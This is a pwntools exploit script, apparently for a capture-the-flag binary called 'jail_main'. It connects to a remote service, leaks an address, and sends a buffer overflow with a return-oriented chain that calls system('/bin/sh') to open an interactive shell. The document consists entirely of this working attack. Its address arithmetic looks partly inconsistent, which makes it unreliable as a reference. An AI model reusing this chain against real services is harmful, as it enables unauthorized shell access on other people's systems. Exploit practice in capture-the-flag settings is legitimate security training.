#!/usr/bin/python3
from pwn import *
import os


context.binary = binary = "./jail_main"

vuln_elf = ELF(binary)
vuln_rop = ROP(vuln_elf)
libc = ELF("./jail_libc.so.6")
vuln_libc = ROP(libc)



p = remote("10.21.232.3", 6969)
p.sendafter(b"option: ", b"a\n")
p.sendafter(b"number: ", b"123\n")
p.recvuntil(b"here btw: ")
start_call_main_128 = int(p.recvline().strip(), 16)

log.info(f"{hex(start_call_main_128)=}")
libc.address = start_call_main_128

vuln_libc.address = libc.address


log.info(f"{hex(libc.address)=}")
log.info(f"{hex(libc.sym['system'])=}")
log.info(f"{hex(libc.search(b'/bin/sh').__next__())=}")


p.sendafter(b"option: ", b"b\n")

payload = b"A" * 135


payload += p64(libc.address + vuln_libc.find_gadget(["pop rdi", "ret"]).address)
payload += p64(libc.search(b"/bin/sh").__next__())
payload += p64(libc.address + vuln_libc.find_gadget(["ret"]).address)
payload += p64(libc.sym["system"])
payload += p64(libc.sym.exit)


p.sendafter(b"address: ", payload + b"\n")
p.interactive()
